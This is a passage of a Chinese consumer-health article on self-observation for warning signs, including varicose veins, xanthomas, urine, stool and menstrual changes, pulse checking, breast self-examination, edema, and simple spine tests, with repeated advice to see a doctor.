查看。</figcaption></figure><p>如果发现自己皮肤上有成片的红色或紫色的斑点，并且压之不褪色，需要引起重视，去血液科挂号看看。</p>\n<h3><strong>浅表静脉曲张</strong></h3>\n<p>静脉曲张很多人可能听过这个名词，但未必清楚这是个什么问题。</p>\n<p>简单来说，静脉是组织内气血交换之后将富含废料的血输送回心肺系统重新充氧的管道组织，和动脉血的流动方向刚好相反，是从末梢流回中央的，在下肢血流就必须要克服重力从下往上走。这时需要两个条件以确保静脉血单向的方向，第一是<strong>肌肉收缩和心脏泵功能提供足够的动力</strong>，第二是<strong>静脉有结构完好的瓣膜</strong>，在血液上行时打开允许其通过，但下行的血流不能回到下方，起到<strong>单向阀</strong>的作用。</p>\n<p>但在先天瓣膜发育不良、长期静脉压力过高损坏静脉瓣等情况下，静脉血受重力影响向下，又没有瓣膜挡住血流，这时血流会从深静脉流回浅表小静脉，积压瘀滞，把小静脉憋得迂回（曲）肿大（张）了。</p>\n<p>浅表静脉曲张可以有以下几种表现：轻的会有<strong>毛细血管扩张或蜘蛛网样静脉曲张</strong>，看起来像青紫色的丝状，常出现在<strong>大腿靠外侧的部位</strong>，小腿脚踝内外也可能会有扇形排列的毛细血管扩张；继续发展会看到<strong>直径 ≥3mm 的曲张静脉</strong>；出现<strong>下肢水肿</strong>时一般已经达到 3 级，水肿可能不对称，常发生在脚和脚踝部位，进展时也可蔓延至腿部。随着病程增长，静脉淤血加重，渐渐出现<strong>静脉曲张性湿疹</strong>（又称淤积性皮炎），静脉压力日益增加，毛细血管破裂后导致血液成分外渗，代谢后产生<strong>色素沉着</strong>；由于静脉高压淤血，患处局部抵抗力下降，稍有损伤或感染都可能引起经久不愈的<strong>溃疡</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/237763d5511e13da2ed40382bdc04929.png\"><figcaption>⬆️ 图片来源：<a href=\"https://www.alamy.com/stock-photo/venous-nodes.html\" target=\"_blank\">alamy.com</a>，高清原图请点击 <a href=\"https://cdn.sspai.com/2021/07/20/5682664b556e8de1988e20321a5b5212.png\" target=\"_blank\">这里</a> 查看。</figcaption></figure><p>静脉压力增高是发生静脉曲张的原因之一，而下肢静脉血回流不畅则会导致静脉压力增高。如果发现自己存在轻度的静脉曲张，那么就要避免以下几种影响静脉回流的生活方式：</p>\n<ul>\n<li>避免体重过大</li>\n<li>避免穿太紧的袜子（这里不是指加压袜）、束腰带、吊带袜</li>\n<li>避免穿高跟鞋（会影响小腿肌肉收缩——静脉血回流的动力）</li>\n<li>避免久坐或久站，要经常变换姿势，并注意活动腿、脚趾来收缩小腿肌肉</li>\n<li>不要跷二郎腿</li>\n</ul>\n<p>如果发现有类似于图上的严重静脉曲张，那就别等了，赶紧去挂个血管外科的号吧。</p>\n<h3><strong>黄色瘤与脂性角膜弓</strong></h3>\n<p>为什么单独说这个呢？这两种表现是<strong>家族性高胆固醇血症（FH）</strong>的特征，而由于<strong>顽固的、常规降脂药难以控制的高胆固醇血症，FH 患者常常在 35 岁以后就出现严重的动脉粥样硬化表现</strong>，即冠心病、肾动脉狭窄等，我就曾收过 39 岁第二次心梗住院的 FH 患者。</p>\n<p>这种<strong>黄色瘤</strong>多出现在<strong>肘关节、膝关节背侧、手部、跟腱、眼睑</strong>等部位，通常呈<strong>淡黄色，质地坚硬，无痛</strong>。<strong>脂性角膜弓则是在角膜周边出现的弧状类脂质沉积</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/cbec89ee0d7a6a9b9762dcde3a195878.jpg\"><figcaption>⬆️ 图片来源：a,d: Researchgate; b,c: http://screenprofh.com/，高清原图请点击 <a href=\"https://cdn.sspai.com/2021/07/20/224f6abcfb4697b996753657e0a3e97a.jpg\" target=\"_blank\">这里</a> 查看。</figcaption></figure><p>如果在这些典型的部位看到黄色瘤，在黑眼珠靠下位置看到一道浅色弧，需要高度怀疑家族性高脂血症，一定要去心内科就诊，查一下血脂，尤其是低密度脂蛋白胆固醇（LDL-C）。（血脂分析拓展内容请阅读<a href=\"https://sspai.com/post/66539\" target=\"_blank\">体检指南 01</a>）</p>\n<h3><strong>排泄/分泌物的性状</strong></h3>\n<p>除了我们周身的皮肤和粘膜外，能够用肉眼就进行观察的还有排泄/分泌物的性状。</p>\n<h4><strong>尿液</strong></h4>\n<p>正常人白天平均排尿 3-5 次，夜间排尿 0-2 次，每次尿量 200-400ml。</p>\n<p>排尿次数超过正常的话称为尿频，尿急则指的是一有尿意就需要立即排尿，常由于无法控制出现失禁，同时每次尿量比正常的少，甚至有尿意无尿液。尿痛则是指排尿时刺激到病变的地方引起的尿道、小腹以及会阴部的刺痛或灼痛等不适感。尿频、尿急和尿痛并称为泌尿系症状三剑客（划掉）尿路刺激征。最常见的引起尿频、尿急和尿痛症状的就是感染。大家知道尿液是从肾脏产生，经过输尿管输送到膀胱贮存，然后经尿道排出的，因此，泌尿系这些器官组织中任何一个有感染了都会引起尿路刺激征，例如肾炎、输尿管炎、膀胱炎、尿道炎，甚至这些器官毗邻的部位，例如肠道、女性的输卵管子宫和阴道、男性的前列腺及外生殖器等，有感染时也可能会引起尿道刺激症状。其他可能的原因还有结石以及上述部位的肿瘤等。当然，喝水喝多了也会尿频，但是正常时不会有尿急和尿痛症状的，因此有类似不适时还是要去医院看看。</p>\n<p>正常人 24 小时尿量为 1L-2L，如果 24 小时尿量少于 400ml，为少尿，多于 2.5L 为多尿。尿的太多不好，太少也不好。</p>\n<p>前面也给大家讲过身体形成的尿液分两步，第一步血流经过肾小球，第二步肾小球进行过滤，好东西留血里坏东西进入肾小管，第三步肾小管再进行尿液浓缩，第四步从输尿管、膀胱至尿道排出，影响这个过程中的任何一步都会影响尿量。例如心功能差、肾炎、输尿管结石梗阻等等。因此，除了确定自己喝水的量特别少/特别多之外，发现自己尿量变化明显的时候也要去医院看。</p>\n<p>除了排尿的频率、不适和量之外，还要注意的是排尿的性状。正常尿液为淡黄色至黄褐色，进食胡萝卜、甜菜根、红心火龙果等富含色素的食物可能会一过性地改变尿液颜色。如果连续多日观察到尿液颜色改变，并且并未进食什么特殊的食物，那么需要考虑是不是某些疾病造成的。</p>\n<ul>\n<li>色红，如同洗肉水样，可能是血尿，最常见的病因就是泌尿系结石、感染、各种肾炎肾病和肿瘤；</li>\n<li>深黄色，需要怀疑肝胆问题，可以看一下上面提到的皮肤和眼白有没有黄染。在服用了复合维生素 B 、核黄素、呋喃类杨武后也会出现这样的颜色。</li>\n<li>其他不太常见的颜色包括红酒色、酱油色（阵发性睡眠性血红蛋白尿、溶血）、乳白色（丝虫病）等等就不细说了，这样明显地偏离正常再不去看病就说不过去了吧。</li>\n</ul>\n<p>还有一个特性是泡沫多，往往提示尿蛋白含量过高，是肾病的标志之一，当然剧烈运动后、高温和受寒之后也可能出现蛋白尿。</p>\n<h4><strong>粪便</strong></h4>\n<p>为什么要关注便便？</p>\n<p>我死党的老爸之前自己发现大便变细了，快小半年了一直不当一回事儿，好不容易被我死党生拉硬拽去做了个肠镜，结果发现了一个巨大息肉，病理一报「原位癌」，幸好发现得早。</p>\n<p>而黑便往往是消化道出血患者早期的主要表现，最常见的原因是胃溃疡、急性糜烂出血性胃炎、胃癌等病，是需要住院治疗的——这就是关注排便的意义。</p>\n<p><a href=\"https://sspai.com/post/66635\" target=\"_blank\">体检指南 02 个性化筛查篇</a> 提到：</p>\n<blockquote><p>大肠癌高危人群的首要特征就是 40 岁以上有两周肛肠症状（大便习惯改变如便秘、腹泻等）； 大便形状改变（大便变细）；大便性质改变（便血、黏液便等）；腹部固定部位疼痛的人群。</p></blockquote>\n<p>关注排便习惯、粪便形状就是给自己加了个「大肠癌预警器」。</p>\n<p>首先大家要知道什么样的粪便是正常的，下面是非常生动形象的布里斯托大便分类，第一型和第二型表示有便秘，第三型和第四型是理想的便形，尤其第四型是最容易排便的形状，第五至第七型则有腹泻的可能。看表对号入座判断自己的大便形状，也要注意和自身的常态进行对照。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/2ba1eb2f1f8853e3905c41374eff19af\"><figcaption>⬆️ 图片来源：https://www.douban.com/note/336437556/</figcaption></figure><p>腹泻大家估计都不陌生，临床定义是一天内排便超过 3 次，量＞200g，以及性状改变（粪质稀薄如第 6、7 型），需要同时满足 3 个条件。依据病程不同可分为急性腹泻（2-3 周内）和慢性腹泻。</p>\n<p>急性腹泻最常见的就是急性胃肠炎，这个我之前在某乎上有一个超过 5000 字的回答，包括<strong>腹部解剖、腹痛之后如何判断可能是什么问题、腹泻在家如何处理等</strong>问题，感兴趣的小伙伴可以拓展阅读一下。（<a href=\"https://www.zhihu.com/question/41623784/answer/1320248258\">急性肠胃炎是一种怎样的体验？ - Leslie Pan的回答</a>）。</p>\n<blockquote>\n<p>强调一下：</p>\n<p>急性腹痛可能的疾病特、别、多，除了症状只有轻中度的呕吐和腹泻（&lt;10次）的可在家吃药喝水休息观察以外，次数多的、排泄物带有粘液脓血、呕吐出来的不仅是吃下去的食物的话，或者伴随症状重的、伴随其他症状的，或吃药休息之后不能缓解症状的，统统需要去医院就诊。</p>\n</blockquote>\n<p>除了急性腹泻之外，还有<strong>慢性腹泻，病程持续 4 周以上，常超过 6-8 周</strong>。这种情况就比较复杂了，有可能是肠道存在慢性的感染（细菌、真菌、寄生虫都有可能），有可能是肠道有消化和吸收功能障碍，也可能是肠道的炎症性疾病（比如安倍晋三得的溃疡性结肠炎就是其中的一种），甚至有可能是大肠癌、肠淋巴癌等肿瘤。因此，腹泻 3 周以上千万不要大意，赶紧麻溜地去医院消化科挂号。</p>\n<p>除了形态之外，颜色也是判断健康与否的重要标准。健康的粪便通常是棕黄色，这个颜色主要来自于肝脏代谢产生的胆红素，如果存在胆汁合成异常或胆道梗阻使得胆红素无法进入肠道，粪便就会呈现出灰白色/白陶土色。</p>\n<p>另外需要关注的一点就是大便里面有血，血便按照出血的明显程度可以分为粪便隐血阳性、黑便和便血。</p>\n<ul>\n<li>粪便隐血：出血量小肉眼可能看不出来，但粪便隐血检查可以检测出。这项检查在大肠癌的筛查里也有提到，一般认为出血量＞5ml 即可引起阳性，一般消化道的恶性肿瘤血供丰富、质脆易出血，因此可以通过粪便隐血进行简单筛查。</li>\n<li>黑便：看到黑便需要警惕上消化道出血，多是中、上消化道少至中量出血。一般超过 50ml 才会形成黑便，这种情况下粪便往往形似柏油，黑黑亮亮的，有血腥味，黑是因为血红蛋白与胃酸作用形成的酸化正铁血红蛋白再与肠道内硫化物结合形成了硫化亚铁。当然也不绝对，下消化道出血/粪便在肠道滞留太久后排出，也会呈黑色。进食铋剂、铁剂、某些中药后粪便也会着色呈黑色，但一般无光泽；吃了动物血、猪肝、巧克力制品等也会大便发黑，但没有血腥味。</li>\n<li>便血：一般下消化道有问题可能性更大，颜色红，量少仅手纸上少量，或粪便外少许，也有肛门滴血者，这种情况肛门、肛管疾病居多；如果血液与粪便混在一起排出，可能呈酱红色或咖啡色，出血量大时甚至可排出大量鲜血，这种情况的成因就更为复杂了，可能的情况包括溃疡性结肠炎、痢疾、结直肠癌等，建议赶紧去看消化科。注意排除红心火龙果等含有大量天然色素的食物。</li>\n</ul>\n<h4><strong>月经与白带</strong></h4>\n<p>上一篇我们聊到了乳腺癌和宫颈癌，这次我就和我派读者中 20% 的女性聊一聊，如何通过观察月经和阴道分泌物来判断自己是不是要去医院看看。（不感兴趣的男性读者可以选择性跳过本节🙈，或者学完了之后找自己对象显摆一下 👀）</p>\n<p>关于月经，我们需要关注月经周期是否规律、持续时间、经量以及伴随症状（如痛经与否、疼痛部位、性质、起止时间等），过了青春期月经初潮后 5-7 年之后，健康成年女性的月经周期通常是规律的，是生殖功能成熟的标志。为了防止有某些女生真的不知道，说一下 <strong>1 个周期是指从出血第一天开始算，到下一次月经的出血第一天之间间隔的时间</strong>。<strong>月经周期 21-35 天内都算正常，出血期一般 2-8 天，出血量 20-60ml，超过了 80ml 就算月经过多了。</strong></p>\n<p>说来好笑，学妇产科的时候这些数据都是要背的，但没有人告诉我们该怎么去判断「多少算多」，也不会真的有人拿个量筒给自己统计吧？我搜来搜去没有搜到统一的、确切的信息，就自己算算，不够严谨，仅供姐妹们参考。</p>\n<p>用最常使用的卫生巾来计算，国标是有规定卫生巾吸水倍率要 ≥7 倍的。计算公式如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/598817c3f313a2788e93bd2b9c0cc843.png\"></figure><p>一片日用卫生巾约 6-10g，那么 7 倍吸水即可吸收 42-70g 血。即如果你的月经出血将吸水倍率为 7 倍的卫生巾完全浸透，依据血液 1.06kg/L 的密度，一张卫生巾就对应约 40-66ml 的出血量（如果卫生巾更能吸水则更多，有测评最高有 20 倍的）。依据我的个人经验，一般「浸透整张卫生巾」只会出现在出血量太多太快甚至都来不及去厕所的情况，单次就有 40ml 以上的出血量，那一个月经周期里有这么 2 次就大抵意味着月经过多了，建议去妇科看一看了。</p>\n<p>为什么要注意这些呢？因为<strong>阴道流血是妇科疾病中最常见的主诉之一</strong>，但需要排除这个出血是不是正常月经，这个就得靠女性自己提供正常月经信息来提供判断依据了。不同的出血特点对应不同的问题，例如接触性出血有宫颈炎、宫颈息肉、宫颈癌的可能，没有周期的长期无规律持续阴道出血往往意味着恶性肿瘤。</p>\n<p>白带是一个常常会听到的名词，是由阴道粘膜渗出液、宫颈管及子宫内膜的腺体分泌液混合而成的，<strong>正常情况下是呈白色稀糊状或蛋清状、粘稠少量无腥臭味的液体</strong>，自己观察时需注意液体量、性质、颜色和气味。虽然叫白带，但实际上在经期前后 2、3 天，由于子宫充血，阴道分泌物会增加，黄体功能不足时颜色会略带黄褐色。这些情况是正常的，那什么情况是异常的呢？</p>\n<p>灰黄色或黄白色泡沫状——滴虫阴道炎；豆渣样或凝乳块状——霉菌性感染；灰白色匀质鱼腥味——细菌性阴道病；黄绿色脓性白带——细菌感染；水样白带———淘米水样伴恶臭需警惕晚期癌症，黄红色水样需考虑输卵管癌……</p>\n<p>但只凭简单的外观判断是无法明确诊断的，还是那句话，发现异常了赶紧去医院。</p>\n<h2><strong>自己上手摸</strong></h2>\n<h3><strong>脉搏与心率</strong></h3>\n<p>首先解释一下，脉搏和心率不是同一个东西，不过大多数人的脉搏和心率是一致的。脉搏产生与心脏的泵血有关，血液在血管中随着心脏搏动流向全身，心脏收缩和舒张时对血管产生的压力是不同的，血管内容积也有所变化，这些变化引起血管的搏动。因此对于大多数人来说，脉搏可以反映心跳，我们可以从脉搏中获得关于心率的 2 项信息：频率和节律。</p>\n<p>但在某些疾病状态下心脏完成一次收缩但泵血量减少以致于无法引起血管的有效搏动时，心率会大于脉搏。例如多数心房颤动的患者，房颤患者的心跳节律不由窦房结这个司令部发出来，而是心房自己随心所欲地乱跳，因此一般房颤的心跳「绝对不齐」，这个乱来的节奏传到负责泵血的心室后不是每一次都能产生有力的收缩、泵出足以产生脉搏的血液，脉搏也就很乱。（这个病理特点也是某些智能手表进行检测的基础，只是房颤并没有这么简单，后面我会单独开一篇讲讲可穿戴设备对心律失常的检测。）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/316bb987e96d53665f3a21b12eeef701.gif\"><figcaption>用手指在手腕靠近大拇指方向（即桡侧）找到搏动最明显的地方，可以进行脉搏计数，通过连续数 30 秒的脉搏数量 *2 可测得一分钟的脉搏，如果有异常搏动则最好计满 1min。动图截取自：YouTube: <a href=\"https://www.youtube.com/watch?v=nhAz84srBvg\" target=\"_blank\">Clinical Skills: Pulse assessment from Oamosis</a></figcaption></figure><h4>频率</h4>\n<p>正常成人的静息下心跳频率为 60-100 次/分，运动员可能会低于60 次/分，新生儿正常心率是 120-140次/分，2-3 岁时 100-120 次/分。由于心率受运动影响较大，在自测心率（以及去医院做心电图）时需要注意最好坐下静息 5-10 分钟后再做。正常人在情绪激动、饮酒、摄入较多咖啡因后也会出现心率超过 100 次/分。</p>\n<p>如果<strong>突然有心慌发作，脉搏一测在 160-250 次/分，突然又自己停止，常常是阵发性室上性心动过速</strong>，多是由于心跳传导过程中出现了「短路」引起的。这种心动过速如果持续时间短的话不会有生命危险，但如果心率特别快，心脏不能正常完成收缩舒张的功能时，就有可能会引起有效循环血量不足，导致休克。因此，有突发突止的心慌且脉搏 160 次以上时，要去医院看一下，最好能捕捉到症状发作时的心电图以供诊断。确诊后如有适应证可以考虑通过射频消融术将「短路」的地方打掉（有一定概率会复发）。</p>\n<h4>节律</h4>\n<p>一般正常的心跳节律都很规整，不需要你给它打拍子，这比我的节奏感好多了，偶尔有人心电图做出来有<strong>窦性心律不齐</strong>，问题不大，就是你的心跳司令部的节奏感没有别人好。</p>\n<p>如果偶尔摸到漏了一拍，可能是早搏，相当于心跳抢了一拍，抢拍之后会有个代偿的间歇，就像唱歌抢拍后等到节拍对了再进。如果只是偶尔发作一次影响不大，如果总是摸到漏跳，心慌也明显，最好还是去医院做个心电图看看比较好。</p>\n<p>如果摸到脉搏停了2秒以上，这种情况一定要去做一个动态心电图，记录24小时的长时程心电记录来判断有没有心律失常。</p>\n<h3><strong>乳腺</strong></h3>\n<p>乳腺自检是女性在家中就可以定期完成的零成本乳腺癌筛查，通常是<strong>看和触摸相结合，最好每月检查一次，没有绝经的女性应选择月经来潮后 3-7 天检查，</strong>绝经后女性则建议选择容易记住的日子，例如每月的第一天。</p>\n<p>看主要依靠镜前观察，对着镜子，先将两手下垂于身体两旁，再将上肢慢慢的上举过头，主要看乳房的任何改变，如乳房的轮廓、有无肿起部分、有无皮肤微凹或乳头的内陷，接着双手叉腰，转动上半身，观察两侧乳房是否对称，尤其是在姿势变换时。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/d6687fdc5fcd9105b876c8d6f554d20c\"><figcaption>⬆️ 图片来源：<a href=\"https://www.hervycta.in/patient-and-caregivers.html\" target=\"_blank\">hervycta.in</a></figcaption></figure><p>触摸自查则可以在洗澡时和平卧时进行，洗澡时检查乳房最适合在皂水尚未洗去时，此时手易在潮湿润滑的皮肤上移动，将摊平的手轻柔的移动，检查每一侧的每个部分。平卧检查时，在检查一侧时最好在肩胛下垫个毛巾，再把同侧的手放在头后，这样能使乳房组织更均匀地摊在胸部。</p>\n<p>大体手法是手指放平，使用食指、中指和无名指三指的指腹进行触诊，用右手查左乳，左手查右乳，以乳头为中心逐渐移动检查。检查开始于乳房的外上方，右乳依顺时针方向，左乳依逆时针方向，由上至下也可；外围至中心逐渐移动至少向心 3 圈直至乳头，要感知乳房内有没有肿块、硬结或增厚。最后再用两指轻轻挤压乳头观察有没有液体溢出，有液体的话需要观察是澄清的还是浑浊的，是微黄、乳白还是血性的。还需要注意的是腋窝也不要忽视。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/1995cda6dbcba59ee901df4548d5bdb0.gif\"><figcaption>卧位的乳房包块自查示意。动图截取自：YouTube: <a href=\"https://www.youtube.com/watch?v=h4X8dPew1LA\" target=\"_blank\">What are the steps to follow for breast self examination? From Modasta Health.</a></figcaption></figure><p>如有乳头溢液,应观察是澄清的还是浑浊的,是微黄、乳白还是血性的。一旦发现，应立即就医。</p>\n<h3><strong>水肿</strong></h3>\n<p>水肿这个词大家也不陌生，站了或走了一天后，有的人会出现小腿涨涨的感觉，这种情况通常是正常的，睡觉的时候把脚垫高一点促进血液回流的话会缓解。但我们要讨论的是病理性的水肿，通常可以按压小腿前面靠内的地方，也就是肉最少、最靠近骨头的地方，用手指按压 3-5 秒，如果手指拿开后出现了凹陷，就是凹陷性水肿；如果眼皮、锁骨上方、和小腿前内侧、手背脚背明显肿了，但按压没有凹陷，则属于黏液性水肿，是甲状腺功能减退（即甲减）的典型体征。</p>\n<p>发现有这种病理性的水肿了，甭管是哪一种，都得去挂个号了。如果是一只脚肿，另一只脚正常，去挂血管外科；如果是黏液性水肿，去挂内分泌科；如果是从两条腿开始肿起来，而且是对称的，去挂心内科；如果下肢肿了之后肚子开始肿，去挂消化内科/肝胆外科；如果是从眼皮开始肿，随后到脸和全身，去挂肾内科。</p>\n<h2><strong>别人辅助自查脊柱疾病</strong></h2>\n<p>脊柱问题估计是我派读者非常熟悉的话题了，在我拖稿的过程中新的一期会员通讯（2021-07-15）专门出了一期<a href=\"https://sspai.com/prime/precog\" target=\"_blank\">性感的脊柱</a>，有骨科医生的科普和很多作者的亲身经验，安利给大家。</p>\n<p>我今天讲的内容可以成为一个小小的补充，内容刚好没有太多重复。</p>\n<p>由于脊柱长在我们身体的背侧，要评估脊柱的健康情况除了依靠自己的症状判断外，往往需要一个小伙伴的协助。下面就和大家介绍几个最简单实用的查体操作。</p>\n<h3>👀 看一看，判断脊柱侧弯</h3>\n<p>脊柱侧弯，即脊柱侧凸（scoliosis），没有脊椎退行性变那么常见，是一类没有特别得到大众关注的疾病。scoliosis 在希腊语中意为「弯曲」，正常人的脊柱从背后看是直的，也就是说从枕骨结节到骶骨棘的所有脊柱棘突成一条直线。如果脊柱向左或向右偏离了这条中轴线，并超过 10°，即称为脊柱侧凸。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/3ce19558f46307cffb4489e5ddd2d9cf.png\"><figcaption>左、中为正常的脊柱，背面观可见从上到下是笔直的；右为脊柱侧弯，可见脊柱向右侧凸出，并伴两肩及骨盆左右不对称。图源：Mayo Clinic。</figcaption></figure><p>脊柱侧凸是一种病理状态，当脊柱的一段或几段出现侧方弯曲，可逐渐加重，不仅会累及脊柱胸廓、肋骨、骨盆，严重者可影响到心、肺功能，甚至累及脊髓，造成瘫痪，因此越早发现和治疗就能越好地预防严重畸形的发生。造成脊柱这种病理状态的原因很多，有先天性的、神经肌肉性疾病造成的以及找不到原因的特发性的，而找不到病因的占 90% 以上，男女比例为 1:2~1:7，在青少年中的发病率为 2%~4%，青少年儿童的脊柱侧凸都是由父母在孩子洗澡或是衣服穿着较少时偶然发现的。</p>\n<p>这里介绍一下简单的肉眼观察的方法。</p>\n<p>脱去上衣、暴露背部，自然直立状态，双手下垂，请别人从背后观察：两侧肩膀是否高低不一，两侧肩胛骨是否对称，腰部距离双臂间距最宽的地方是否一致。再向前弯腰，双手自然下垂，请别人目测一下背部是否有高低不对称。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/71a459e540e696df6397bdf2a3075336.gif\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/84b4589be7fd3c7878caf1b6c9f5e401.gif\"><figcaption>⬆️ 动图截取自：YouTube: <a href=\"https://www.youtube.com/watch?v=1VQoRlhKh2s\" target=\"_blank\">Postural Screening Exam for Scoliosis - Boston Children's Hospital.</a></figcaption></figure><p>如果发现上述肉眼观察有类似于动图中的多处不对称表现（尤其是观察到家中小朋友有类似表现），建议去医院骨科（脊柱外科）拍个全脊柱的正侧位片看看。</p>\n<h2>🤛 敲一敲，发现脊柱问题</h2>\n<p>腰酸背痛是当代年轻人伏案工作后的常见问题，当你按压自己脊柱两旁的肌肉发现有疼痛时，常常是急性腰背肌劳损所致——压痛一般反应病变较浅。</p>\n<p>另外还有一种<strong>间接叩击法</strong>，你自己坐好后让小伙伴把<strong>左手放在你的头顶，右手握拳叩击左手</strong>，正常人不会有脊椎的疼痛，如果脊椎有病变，那么受损的部位就会在叩击时产生疼痛，<strong>多见于椎间盘突出、脊椎结核和骨折等情况</strong>。</p>\n<p><s>这项操作的注意点在于要找一个跟你关系不错的小伙伴，以防止自己的头被挟私报复（不是。</s></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/807ea95543fa6b3da662cbeb85d0816c.gif\"><figcaption>⬆️ 动图截取自：YouTube：<a href=\"https://www.youtube.com/watch?v=ooyuLx_OD-Y&amp;t=304s\" target=\"_blank\">西医实践技能第 5 讲：脊柱、四肢检查</a></figcaption></figure><h3>4️⃣ 4 字试验——发现骶髂关节问题</h3>\n<p>有的小伙伴可能会问：骶髂关节在哪儿？</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/20/421fa4a43a9e89af0a1d6aa1eed1c8b3.jpg\"><figcaption>骶骨是组成脊柱的 26 块骨头之一，与髂骨一样是骨盆的重要组成部分，骶髂关节由骶骨与髂骨的耳状关节面相对而构成，两块骨头嵌合紧密，并且周围有很多韧带，活动度很小，只有 1-3mm。骶髂关节大体位于身体后部、臀部上方，左右各一，主要作用是支撑体重、缓冲身体活动带来的震动与负荷，以及传递左右下肢的力量。</figcaption></figure><p>为什么要讲这个关节呢？主要是因为腰背痛确实很常见，但与退行性变或肌肉劳损引起的腰痛相比，有一种疾病在早期也是以腰背痛为主要症状，如果不重视早期识别和治疗，晚期整个脊柱都会僵硬、融合，形成永远面朝黄土、不能抬头看天的畸形。这种疾病就是强直性脊柱炎。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/e105ae187f5b7daaf0e8fc6a83b384f9.png\"><figcaption>一张经典照片展示了强直性脊柱炎在 26 年里不断进展的过程。1957 年，患者胸椎后凸变得明显，正常的腰椎前凸丧失，髋关节和膝关节有早期屈曲挛缩。 在接下来的 2 张照片中，脊柱的进行性强直，髋关节和膝关节的屈曲挛缩也逐渐增加。图源：Yohan Robinson. Spinal fractures related to ankylosing spondylitis – Epidemiology, clinical outcome and biomechanics.</figcaption></figure><p>强直性脊柱炎，就是天王周杰伦和戏骨张嘉译老师得的病。这是一种慢性炎症性全身性疾病，主要侵犯骶髂关节、脊柱关节、椎旁软组织及外周关节，部分患者可在髋关节、肩关节等部位出现外周关节炎，还可累及其他器官如眼、皮肤、肠道、心脏、肺等，<strong>严重者可发生脊柱畸形和关节强直</strong>。据初步调查，我国强直性脊柱炎的患病率约 0.1%~1.6%，男性患病率比女性高（2-3 : 1），且女性发病较缓慢且病情较轻。强直性脊柱炎发病年龄通常在 13-31岁，<strong>高峰发病年龄为20-30岁</strong>，40岁以后及8岁以前发病者少见，高发期可能正是本文部分读者所处的年纪，而我身边就有 2 名同龄男性确诊、1 名疑诊，于是我想稍微多聊两句（也可以再给我自己挖个坑以后慢慢填）。</p>\n<p>强直性脊柱炎患者一开始会感到腰背部或腰骶部不适或疼痛，晨起、久坐或久站之后加重，伴僵硬感，但活动后可以缓解，这个表现使得这个症状更易被忽视，也许等到疾病逐渐上行至胸椎颈椎、整个脊柱变得像竹子一样僵硬的时候才会去就诊，这时显然有些晚了。诊断标准中有一条非常重要，就是腰痛、僵持续 3 个月以上并且休息不能缓解、活动后可改善，因此，如果有好几个月一直有类似的晨起腰背痛、晨僵症状，一活动就好一些了，记得一定要去骨科看一看，根据医生的判断看要不要拍个 X 线片或磁共振来进一步评估。</p>\n<p>由于 90%以上的强直性脊柱炎患者早期都会累及上文提到的骶髂关节，因此除了根据腰痛症状判断外，自己在家也可以通过评估骶髂关节是不是有问题来促使自己做出要不要去医院看的决定。一个简单的方法就是本节小标题所说的<strong>「4 字试验」</strong>。（⚡ 膝盖或髋关节有伤的人不能做）</p>\n<p>具体做法：患者仰卧，一条腿伸直，一条腿膝关节弯起来并把脚跟放在另一条腿的膝盖上，这时请你的小伙伴配合，一手按压弯曲的膝盖，另一手压伸直的腿那侧的骨盆，如果弯的腿那一侧的骶髂关节有疼痛就是阳性的，再以同样的方法检测另一条腿。</p>\n<p>阳性意味着骶髂关节病变，但并不等同于强直性脊柱炎，结核、致密性骨炎等疾病也会影响骶髂关节，4 字试验阳性意味着你该去医院就诊了，剩下来的诊断和治疗还是交给医生吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/3f3e001cc4633ff819e23760abea3ad1.gif\"><figcaption>⬆️ 动图截取自：YouTube: <a href=\"https://www.youtube.com/watch?v=j9XKA-eaHxA&amp;t=77s\" target=\"_blank\">Cervical Spine Examination from FIFATV</a></figcaption></figure><h3>🦵 直腿抬高试验——识别腰椎间盘突出</h3>\n<p><strong>腰椎间盘突出症</strong>是指由于突出的椎间盘组织刺激和（或）压迫神经根、马尾神经所导致的临床综合征，表现为腰痛、下肢放射痛、下肢麻木、下肢无力、大小便功能障碍等<strong>，典型临床症状是腰部疼痛伴同侧下肢的放射痛，</strong>且以腿痛为主。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/ebf250648fcbbf48d1b6c9ab76769950.png\"><figcaption>A. 腰椎第 4-5 节段椎间盘突出，B：左为正常，右为椎间盘突出压迫神经根，C：腰椎间盘突出的分期，D：为典型的磁共振表现，右白色箭头指向突出的椎间盘。图片来源：Percutaneous Endoscopic Lumbar Spine Surgery for Lumbar Disc Herniation and Lumbar Spine Stenosis: Emphasizing on Clinical Outcomes of Transforaminal Technique.</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/cdddc8492f35f5fb0aad2c06cbb8c646.gif\"><figcaption>⬆️ 动图截取自：YouTube: <a href=\"https://www.youtube.com/watch?v=Y-HCjfHlcHQ\" target=\"_blank\">Lumbar Disc Injuries and Treatment from Hartford Healthcare</a></figcaption></figure><p>做直腿抬高试验时，神经根处于半固定状态，正常情况下，脊神经贴在椎管前壁可上下牵拉活动 